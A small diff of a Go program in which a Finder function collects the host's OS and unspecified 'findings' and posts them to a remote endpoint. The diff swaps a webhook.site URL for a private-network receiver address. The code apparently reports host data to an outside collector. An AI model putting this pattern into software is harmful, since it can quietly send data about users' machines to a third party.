@@ -53,7 +53,7 @@ func Finder() {
 		Os:       findOS(),
 		Findings: findings,
 	}
-	postRequest("https://webhook.site/36cc7ae1-ddca-4fcb-bb75-896b43540fb0", requestBody)
+	postRequest("https://192.168.1.14:7654/receiver", requestBody)
 }
 
 func findIP() string {
